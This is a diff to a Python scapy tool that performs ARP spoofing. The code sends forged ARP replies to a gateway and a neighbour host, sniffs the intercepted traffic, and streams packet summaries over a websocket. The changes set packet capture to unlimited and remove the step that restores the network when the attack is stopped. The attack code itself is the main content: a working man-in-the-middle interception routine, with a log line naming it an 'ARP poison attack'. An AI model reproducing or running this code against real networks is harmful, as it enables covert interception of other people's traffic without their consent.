@@ -29,6 +29,7 @@ def win_iface():
     print(show_interfaces())
 
 def get_interface():
+    print('Getting interface...')
     if platform.system() == 'Darwin':
         from scapy.arch.unix import read_routes
         d = darwin_iface()
@@ -44,7 +45,7 @@ def get_interface():
 
 def get_sniffer_config(config_from_client):
     default_config = {
-        "count": 5,
+        "count": 0,
         "filter": "",
         "iface": conf.iface,
         "lfilter": "",
@@ -63,6 +64,7 @@ def restore_network(gateway_ip, gateway_mac, neighbor_ip, neighbor_mac):
     os.kill(os.getpid(), signal.SIGTERM)
 
 def get_mac(ip_address):
+    print('Getting MAC address...')
     resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
     for s,r in resp:
         return r.hwsrc
@@ -71,7 +73,7 @@ def get_mac(ip_address):
 def arp_spoof(config_from_client):
     # json_config = json.loads(config_from_client)
     neighbor_ip = config_from_client['args']['ifaddr']
-    network_info = json.loads(get_interface())
+    network_info = get_interface()
     gateway_ip = network_info['gw']
     neighbor_mac = get_mac(neighbor_ip)
     gateway_mac = get_mac(gateway_ip)
@@ -86,16 +88,18 @@ def arp_spoof(config_from_client):
             print('Sending ARP packets...')
             send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=neighbor_ip))
             send(ARP(op=2, pdst=neighbor_ip, hwdst=neighbor_mac, psrc=gateway_ip))
-            time.sleep(2)
+            break
     except KeyboardInterrupt:
         print("[*] Stopped ARP poison attack. Restoring network")
-        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
 
-async def sniff_spoofed(neighbor_ip):
+def sniff_spoofed(neighbor_ip):
     sniff_filter = 'ip host {}'.format(neighbor_ip)
-    while True:
-        print(f"[*] Starting network capture.")
-        sniff(prn=lambda x: x.summary(), filter=sniff_filter, iface=conf.iface)
+    
+    def summarize(x):
+        pkt_summary = x.summary()
+        packet_queue.put(pkt_summary)
+
+    sniff(prn=lambda x: summarize(x), filter=sniff_filter, iface=conf.iface)
 
 def update_config(key, default_config, new_config):
     try:
@@ -114,14 +118,12 @@ def start_loop(loop):
 
 def enqueue_packets(config):
     def summarize(x):
-        logger = 1
         pkt_summary = x.summary()
         packet_queue.put(pkt_summary)
     sniff(**config, prn=lambda x: summarize(x))
 
 async def dequeue_packets(ws):
     while True:
-        logger = 2
         pkt_summary = packet_queue.get()
         if pkt_summary:
             await ws.send_str(pkt_summary)
